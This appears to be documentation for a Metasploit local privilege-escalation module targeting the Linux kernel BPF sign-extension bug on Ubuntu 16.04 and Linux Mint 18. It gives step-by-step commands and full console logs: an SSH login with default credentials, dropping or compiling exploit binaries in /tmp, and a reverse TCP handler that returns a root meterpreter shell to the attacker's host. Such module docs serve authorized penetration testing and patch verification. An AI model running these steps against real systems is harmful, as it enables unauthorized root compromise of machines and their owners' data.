## Vulnerable Application

This module exploits the Berkeley Packet Filter in the Linux kernel prior to 4.13.0,
which contains a vulnerability where it may improperly perform sign extentension.
This can be utilized to priv escalate.  However, this module's offsets and
other parameters have only been set and tested against the 4.4.0-116 kernel.

This module has been successfully tested on:

  * Ubuntu 16.04 with the 4.4.0-116 kernel
  * Linux Mint 18 with the 4.4.0-116-generic kernel

### Meterpreter Exception

Due to a bug, this exploit can only be run on a non-meterpreter shell.
When run on meterpreter, or a shell spawned by meterpreter, the error `error: Invalid argument`
is thrown by the executable.

## Verification Steps

  1. Start msfconsole
  2. Exploit a box via whatever method
  3. Do: `use exploit/linux/local/bpf_extension_priv_esc`
  4. Do: `set session #`
  5. Do: `set verbose true`
  6. Do: `exploit`

## Options

  **WritableDir**

  A folder we can write files to.  Defaults to `/tmp`

  **COMPILE**
  
  If we should live compile on the system, or drop pre-created binaries.  Auto will determine if gcc/libs are installed to compile live on the system.  Defaults to `Auto`

## Scenarios

### Ubuntu 16.04 (with Linux 4.4.0-116-generic)

#### Initial Access

  ```
  resource (ubuntu.rb)> use auxiliary/scanner/ssh/ssh_login
  resource (ubuntu.rb)> set rhosts 2.2.2.2
  rhosts => 2.2.2.2
  resource (ubuntu.rb)> set username ubuntu
  username => ubuntu
  resource (ubuntu.rb)> set password ubuntu
  password => ubuntu
  resource (ubuntu.rb)> exploit
  [+] 2.2.2.2:22 - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux '
  [*] Command shell session 1 opened (1.1.1.1:36273 -> 2.2.2.2:22) at 2018-03-23 20:42:04 -0400
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```

#### Escalate

In this scenario, gcc is installed so we can live compile on the system.

  ```
  resource (ubuntu.rb)> use exploit/linux/local/bpf_sign_extension_priv_esc
  resource (ubuntu.rb)> set verbose true
  verbose => true
  resource (ubuntu.rb)> set session 1
  session => 1
  resource (ubuntu.rb)> set lhost 1.1.1.1
  lhost => 1.1.1.1
  resource (ubuntu.rb)> exploit
  [!] SESSION may not be compatible with this module.
  [*] Started reverse TCP handler on 1.1.1.1:4444 
  [+] Kernel confirmed vulnerable
  [+] gcc is installed
  [*] Live compiling exploit on system
  [*] Writing files to target
  [*] Writing vQIIRofN to /tmp/vQIIRofN.c
  [*] Max line length is 65537
  [*] Writing 7797 bytes in 1 chunks of 26837 bytes (octal-encoded), using printf
  [*] Writing iuRJiXBf to /tmp/iuRJiXBf
  [*] Max line length is 65537
  [*] Writing 283 bytes in 1 chunks of 844 bytes (octal-encoded), using printf
  [*] Starting execution of priv esc.
  [*] Transmitting intermediate stager...(126 bytes)
  [*] Sending stage (812100 bytes) to 2.2.2.2
  [*] task_struct = ffff88003869aa00
  [*] uidptr = ffff8800354fb244
  [*] spawning root shell
  [*] Sleeping before handling stage...
  [+] Deleted /tmp/vQIIRofN.c
  [+] Deleted /tmp/vQIIRofN
  [+] Deleted /tmp/iuRJiXBf
  
  meterpreter > sysinfo
  Computer     : 2.2.2.2
  OS           : Ubuntu 16.04 (Linux 4.4.0-116-generic)
  Architecture : x64
  BuildTuple   : x86_64-linux-musl
  Meterpreter  : x64/linux
  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  ```

#### Escalate w/ pre-compiled binaries

It is possible to force pre-compiled binaries, in a scenario where `build-essential` or `gcc` aren't on the system.

  ```
  resource (ubuntu.rb)> use exploit/linux/local/bpf_sign_extension_priv_esc
  resource (ubuntu.rb)> set verbose true
  verbose => true
  resource (ubuntu.rb)> set session 1
  session => 1
  resource (ubuntu.rb)> set lhost 1.1.1.1
  lhost => 1.1.1.1
  resource (ubuntu.rb)> exploit
  [!] SESSION may not be compatible with this module.
  [*] Started reverse TCP handler on 1.1.1.1:4444 
  [+] Kernel confirmed vulnerable
  [-] gcc is not installed.  Compiling will fail.
  [*] Dropping pre-compiled exploit on system
  [*] Writing vsQTwocG to /tmp/vsQTwocG
  [*] Max line length is 65537
  [*] Writing 14040 bytes in 1 chunks of 36802 bytes (octal-encoded), using printf
  [*] Writing JDQDHtEG to /tmp/JDQDHtEG
  [*] Max line length is 65537
  [*] Writing 283 bytes in 1 chunks of 844 bytes (octal-encoded), using printf
  [*] Starting execution of priv esc.
  [*] Transmitting intermediate stager...(126 bytes)
  [*] Sending stage (812100 bytes) to 2.2.2.2
  [*] task_struct = ffff88003a8a3800
  [*] uidptr = ffff88003d276304
  [*] spawning root shell
  [*] Sleeping before handling stage...
  [+] Deleted /tmp/vsQTwocG
  [+] Deleted /tmp/JDQDHtEG
  
  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : 2.2.2.2
  OS           : Ubuntu 16.04 (Linux 4.4.0-116-generic)
  Architecture : x64
  BuildTuple   : x86_64-linux-musl
  Meterpreter  : x64/linux
  ```
### Linux Mint 18

  ```
  msf5 exploit(multi/handler) > use exploit/linux/local/bpf_sign_extension_priv_esc 
  msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > set verbose true
  verbose => true
  msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > set session 1
  session => 1
  msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > check
  
  [!] SESSION may not be compatible with this module.
  [+] Kernel confirmed vulnerable
  [*]  The target appears to be vulnerable.
  msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > set lhost 172.16.191.188
  lhost => 172.16.191.188
  msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > run
  
  [!] SESSION may not be compatible with this module.
  [*] Started reverse TCP handler on 172.16.191.188:4444 
  [+] Kernel confirmed vulnerable
  [+] gcc is installed
  [*] Live compiling exploit on system
  [*] Writing files to target
  [*] Writing UVQYvBTJ to /tmp/UVQYvBTJ.c
  [*] Max line length is 65537
  [*] Writing 7773 bytes in 1 chunks of 26765 bytes (octal-encoded), using printf
  [*] Writing ljJApCaK to /tmp/ljJApCaK
  [*] Max line length is 65537
  [*] Writing 283 bytes in 1 chunks of 845 bytes (octal-encoded), using printf
  [*] Starting execution of priv esc.
  [*] Transmitting intermediate stager...(126 bytes)
  [*] Sending stage (812100 bytes) to 172.16.191.207
  [*] task_struct = ffff88003ce84600
  [*] uidptr = ffff88003cc46f04
  [*] spawning root shell
  [*] Meterpreter session 2 opened (172.16.191.188:4444 -> 172.16.191.207:48276) at 2018-03-24 22:46:58 -0400
  [+] Deleted /tmp/UVQYvBTJ.c
  [+] Deleted /tmp/UVQYvBTJ
  [+] Deleted /tmp/ljJApCaK
  [!] This exploit may require manual cleanup of '/tmp/UVQYvBTJ.c' on the target
  [!] This exploit may require manual cleanup of '/tmp/UVQYvBTJ' on the target
  [!] This exploit may require manual cleanup of '/tmp/ljJApCaK' on the target
  
  meterpreter > getuid
  Server username: uid=0, gid=0, euid=0, egid=0
  meterpreter > sysinfo
  Computer     : 172.16.191.207
  OS           : LinuxMint 18 (Linux 4.4.0-116-generic)
  Architecture : x64
  BuildTuple   : x86_64-linux-musl
  Meterpreter  : x64/linux
  ```
